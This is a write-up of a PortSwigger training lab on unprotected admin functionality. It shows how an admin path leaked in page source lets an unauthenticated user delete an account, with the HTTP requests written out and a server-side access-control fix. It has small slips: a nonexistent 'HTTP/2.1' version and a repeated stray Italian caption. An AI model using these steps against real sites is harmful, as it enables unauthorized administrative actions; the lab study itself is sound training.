
Lab: Unprotected Admin Functionality with Unpredictable URL

• Category: Access Control / Broken Object Level Authorization (BOLA)
• Severity: High
• CWE Reference: CWE-284: Improper Access Control, CWE-613: Insufficient Session Expiration
• Platform: PortSwigger Web Security Academy
• Level: Apprentice

1. Executive Summary & Vulnerability Description

During a security assessment of the target application, a critical access control vulnerability was identified within the administrative architecture. The application relies on "Security through Obscurity" by obfuscating the administrative endpoint URL path (using an unpredictable or randomized string) instead of enforcing robust server-side role-based access control (RBAC).
Furthermore, this sensitive endpoint is inadvertently exposed to unauthorized users within client-accessible resources (such as inline JavaScript or HTML source code). An unauthenticated attacker can harvest this URL via passive reconnaissance, access the administrative control panel directly, and execute high-privilege operations.

2. Laboratory Objective

Locate the obfuscated and unpredictable administrative endpoint exposed within the client-side artifacts, bypass the lack of access controls, and successfully delete the target user account (carlos).

3. Reconnaissance & Threat Modeling


Phase 1: Client-Side Source Inspection

1. Navigate to the application's landing page (https://<LAB-ID>.web-security-academy.net/).
2. Analyze the Document Object Model (DOM) and client-side assets by viewing the page source (Ctrl + U) or using the browser Developer Tools (F12).
3. Search for references to administrative structures, non-standard routes, or embedded scripts.
Discovery:
An inspection of the HTML source code reveals an inline JavaScript block containing a globally accessible variable or an explicit link pointing to an unpredictable route:
html
<script>
    var adminPanelUrl = '/admin-7a8b9c2d1e'; // Obfuscated endpoint exposed to the client
</script>
Usa il codice con cautela.

Phase 2: Endpoint Verification

To confirm the absence of server-side authorization checks, send a direct HTTP request to the discovered URI using an unauthenticated session.
http
GET /admin-7a8b9c2d1e HTTP/2.1
Host: <LAB-ID>.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: text/html
Usa il codice con cautela.
Expected Response:
http
HTTP/2.1 200 OK
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html>
<head><title>Admin Panel</title></head>
<body>
    <h1>Administrative Console</h1>
    <!-- Privileged functionalities rendered without session checks -->
</body>
</html>
Usa il codice con cautela.
The server returns an HTTP 200 OK response, confirming that no session validation, cookie verification, or RBAC mechanism is enforced at the controller level.

4. Exploitation Methodology

1. Access the Console: Append the discovered path (/admin-7a8b9c2d1e) to the base URL in the browser's address bar to render the administrative interface.
2. Identify Target Entity: Locate the user management section and identify the record corresponding to the username carlos.
3. Execution of Privileged Action: Click the "Delete" button adjacent to the target user or intercept the corresponding administrative HTTP request:
http
GET /admin-7a8b9c2d1e/delete?username=carlos HTTP/2.1
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<SESSION_TOKEN>
Usa il codice con cautela.
4. Verification: The application processes the request, returns a redirection (HTTP 302) or a success status, and the laboratory registers a Solved state.

5. Remediation & Defense Strategies


Server-Side Access Control (RBAC)

Never rely on URL unpredictability or obfuscation to secure sensitive functionalities. Enforce centralized, server-side authorization checks on every privileged route.
python
# Conceptual Defensive Implementation (Python/Flask Example)
@app.route('/admin-panel/delete')
@require_authentication
@require_role('Administrator') # Strict server-side RBAC validation
def delete_user():
    username = request.args.get('username')
    # Execution logic...
